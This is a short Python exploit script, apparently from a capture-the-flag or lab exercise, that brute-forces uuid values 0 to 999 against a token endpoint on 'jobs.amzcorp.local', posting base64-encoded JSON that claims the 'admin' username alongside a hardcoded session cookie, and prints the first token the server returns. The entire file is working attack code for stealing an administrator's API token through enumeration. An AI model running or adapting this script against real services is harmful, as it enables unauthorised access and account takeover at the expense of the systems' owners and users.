#!/usr/bin/python3
import requests, base64, sys
from pwn import log

bar = log.progress("uuid")

target = "http://jobs.amzcorp.local/api/v4/tokens/get"

cookies = {"session": ".eJwtjs1uwzAMg9_F52Gw_CPbPe0leg5km8KKNS2QpKdh7z4F20UAP5Aiv92iG_ZPdzm2F97ccpvu4iQG1JbGaL6MOAizpEw5ceYuNXjJFJPMiE69Nyk9BqqQ7pN5FZ6L10qVNeQGKlFH0BmiD1qVUy3EpCgs8BaaypoVoKaIM5UhydmQ147tb03LbGDsmy7H8wsPQzxBCOiZpQrpLKOqVcWRZys9Se1Zh-fzEVa53S1yYD8-zvM-nqvx7XmH4avV7CbPuoes-He6n19qWVRZ.ZQmpEw.z0NP_VJ8coD-NcP01AzIIoAcTXM"}
headers = {"Content-Type": "application/json"}

for uuid in range(0,1000):
    data = '{"get_token": "True", "uuid": "%d", "username": "admin"}' % uuid
    json = {"data": base64.b64encode(data.encode())}

    request = requests.post(target, headers=headers, cookies=cookies, json=json)
    bar.status(uuid)

    if "Invalid" not in request.text:
        print(request.text.strip())
        bar.success(uuid)
        sys.exit(0)
